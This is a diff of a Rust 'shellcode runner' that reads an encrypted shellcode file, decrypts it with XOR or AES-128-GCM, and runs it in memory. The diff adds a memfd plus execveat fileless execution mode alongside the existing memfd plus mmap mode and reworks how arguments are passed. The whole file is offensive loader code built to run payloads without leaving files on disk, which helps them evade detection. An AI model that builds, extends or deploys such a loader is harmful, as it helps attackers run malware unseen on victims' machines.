@@ -2,7 +2,7 @@ use std::fs;
 use libc;
 use lib::crypt;
 use lib::fileless;
-use clap::{Parser};
+use clap::Parser;
 use lib::config::Config;
 use lib::crypt::Algo;
 use lib::crypt::Key;
@@ -10,9 +10,6 @@ mod key_parser;
 
 #[derive(Parser)]
 struct Args {
-    /// File to execute
-    file: String,
-
     /// Choose algorithm used to decrypt to override filename parsing
     #[arg(short, long, value_name = "ALGORITHM")]
     algo: Option<Algo>,
@@ -28,6 +25,13 @@ struct Args {
     /// Use fileless execution with memfd + mmap (requires Linux 3.17+)
     #[arg(long)]
     fileless_mmap: bool,
+
+    /// Use fileless execution with memfd + execveat (requires ELF shellcode and Linux 3.19+)
+    #[arg(long)]
+    fileless_execveat: bool,
+
+    /// File to execute
+    file: String,
 }
 
 fn read_shellcode(path: &str, config: &Config) -> Vec<u8> {
@@ -76,7 +80,7 @@ fn free_mem(mem: *mut libc::c_void, size: usize, config: &Config) {
     }
 }
 
-fn decrypt_shellcode(shellcode: &mut Vec<u8>, file: &str, algo: Option<Algo>, key: Option<String>, config: &Config) {
+fn decrypt_shellcode(shellcode: &mut Vec<u8>, file: &str, algo: Option<&Algo>, key: Option<&String>, config: &Config) {
     config.log("Checking if file needs decrypting...");
     let needs_decrypt = algo.is_some()
         || file.ends_with(".xor")
@@ -85,20 +89,31 @@ fn decrypt_shellcode(shellcode: &mut Vec<u8>, file: &str, algo: Option<Algo>, ke
     if !needs_decrypt { return; }
 
     config.log("File needs to be decrypted");
-    let (_, key) = key_parser::key_parser::resolve_encryption(file, algo, key, config)
-        .unwrap_or_else(|e| { eprintln!("{}", e); std::process::exit(1); });
+    let (_, resolved_key) = key_parser::key_parser::resolve_encryption(
+        file,
+        algo.cloned(),
+        key.cloned(),
+        config,
+    )
+    .unwrap_or_else(|e| { eprintln!("{}", e); std::process::exit(1); });
 
-    match &key {
+    match &resolved_key {
         Key::Xor(k) => config.log(&format!("Decrypting with XOR key 0x{:02X}...", k)),
         Key::Aes(_)  => config.log("Decrypting with AES-128-GCM..."),
     }
 
-    crypt::create_cipher(&key).decrypt(shellcode);
+    crypt::create_cipher(&resolved_key).decrypt(shellcode);
 }
 
-fn run_shellcode(shellcode: &[u8], config: &Config, use_fileless_mmap: bool) {
-    if use_fileless_mmap {
+fn run_shellcode(shellcode: &[u8], config: &Config, args: &Args) {
+    if args.fileless_mmap {
         fileless::execute_fileless_mmap(shellcode, config)
+            .unwrap_or_else(|e| {
+                eprintln!("{}", e);
+                std::process::exit(1);
+            });
+    } else if args.fileless_execveat {
+        fileless::fileless_execveat(shellcode, config)
             .unwrap_or_else(|e| {
                 eprintln!("{}", e);
                 std::process::exit(1);
@@ -119,8 +134,8 @@ fn main() {
     config.log("Starting shellcode runner...");
 
     let mut shellcode = read_shellcode(&args.file, &config);
-    decrypt_shellcode(&mut shellcode, &args.file, args.algo, args.key, &config);
-    run_shellcode(&shellcode, &config, args.fileless_mmap);
+    decrypt_shellcode(&mut shellcode, &args.file, args.algo.as_ref(), args.key.as_ref(), &config);
+    run_shellcode(&shellcode, &config, &args);
 
     config.log("Done!");
 }
